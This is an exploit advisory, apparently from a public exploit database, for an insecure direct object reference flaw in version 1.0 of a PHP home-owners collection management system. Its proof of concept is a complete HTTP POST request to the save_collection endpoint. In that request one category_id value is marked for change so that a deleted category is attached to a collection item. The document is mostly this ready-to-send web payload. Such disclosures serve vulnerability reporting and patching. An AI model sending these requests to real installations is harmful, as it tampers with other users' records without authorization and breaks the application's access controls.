# Exploit Title: Home-owners-collection-management-system v1.0 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Home-owners-collection-management-system v1.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add a category who is deleted to a collection_item(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
POST /hocms/classes/Master.php?f=save_collection HTTP/1.1
...

------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="id"

7
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="date_collected"

2023-10-04
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="collected_by"

user2
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="member_id"

1
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="fee[3]"

100
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="fee[4]"

100
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="fee[1]"

200
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="fee[5]"

50
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="fee[2]"

200
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="category_id[2]"

6(CHANGE HERE)
------WebKitFormBoundaryffgBAyeF5VOyAwiT
Content-Disposition: form-data; name="total_amount"

200
------WebKitFormBoundaryffgBAyeF5VOyAwiT--
```